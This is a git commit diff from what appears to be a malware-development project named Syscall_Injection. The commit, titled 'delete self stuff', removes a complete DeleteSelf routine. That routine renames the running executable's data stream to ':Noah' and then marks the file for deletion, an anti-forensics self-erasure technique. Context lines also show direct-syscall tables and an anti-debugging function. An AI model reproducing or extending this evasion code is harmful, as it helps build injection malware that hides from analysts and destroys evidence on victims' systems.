807236d37e0cd3acded27b51f4eb6a53d4c58fd4
MALDEV01 <MALDEV01@DESKTOP-M919A7K>
2024-06-08 12:35:40 -0700

    delete self stuff

--- Syscall_Injection/main.c
+++ Syscall_Injection/main.c
@@ -29,8 +29,6 @@ PVOID* pSystemCalls[num_syscalls];
 VX_TABLE VxTable = { 0 };
 void initializeSystemCalls() {
     
-    
-
     if (pSystemCalls == NULL) {
         printf("Mem allocation error\n");
         exit(1);
@@ -349,92 +347,7 @@ void detectDebug() {
 #define NEW_STREAM L":Noah"
 BOOL DeleteSelf() {
 
-
-    WCHAR                       szPath[MAX_PATH * 2] = { 0 };
-    FILE_DISPOSITION_INFO       Delete = { 0 };
-    HANDLE                      hFile = INVALID_HANDLE_VALUE;
-    PFILE_RENAME_INFO           pRename = NULL;
-    const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
-    SIZE_T			            StreamLength = wcslen(NewStream) * sizeof(wchar_t);
-    SIZE_T                      sRename = sizeof(FILE_RENAME_INFO) + StreamLength;
-
-
-    // Allocating enough buffer for the 'FILE_RENAME_INFO' structure
-    pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
-    if (!pRename) {
-        printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
-        return FALSE;
-    }
-
-    // Cleaning up some structures
-    ZeroMemory(szPath, sizeof(szPath));
-    ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));
-
-
-    //----------------------------------------------------------------------------------------
-    // Marking the file for deletion (used in the 2nd SetFileInformationByHandle call) 
-    Delete.DeleteFile = TRUE;
-
-    // Setting the new data stream name buffer and size in the 'FILE_RENAME_INFO' structure
-    pRename->FileNameLength = StreamLength;
-    RtlCopyMemory(pRename->FileName, NewStream, StreamLength);
-
-    //----------------------------------------------------------------------------------------
-
-    // Used to get the current file name
-    if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
-        printf("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
-        return FALSE;
-    }
-
-    //----------------------------------------------------------------------------------------
-    // RENAMING
-
-    // Opening a handle to the current file
-    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        printf("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
-        return FALSE;
-    }
-
-    wprintf(L"[i] Renaming :$DATA to %s  ...", NEW_STREAM);
-
-    // Renaming the data stream
-    if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
-        printf("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
-        return FALSE;
-    }
-    wprintf(L"[+] DONE \n");
-
-    CloseHandle(hFile);
-
-    //----------------------------------------------------------------------------------------
-    // DELETING
-
-    // Opening a new handle to the current file
-    hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
-        printf("[!] CreateFileW [D] Failed With Error : %d \n", GetLastError());
-        return FALSE;
-    }
-
-    wprintf(L"[i] DELETING ...");
-
-    // Marking for deletion after the file's handle is closed
-    if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
-        printf("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
-        return FALSE;
-    }
-    wprintf(L"[+] DONE \n");
-
-    CloseHandle(hFile);
-
-    //----------------------------------------------------------------------------------------
-
-    // Freeing the allocated buffer
-    HeapFree(GetProcessHeap(), 0, pRename);
-
-    return TRUE;
+//still need to go back and make this myself
 }
 
 
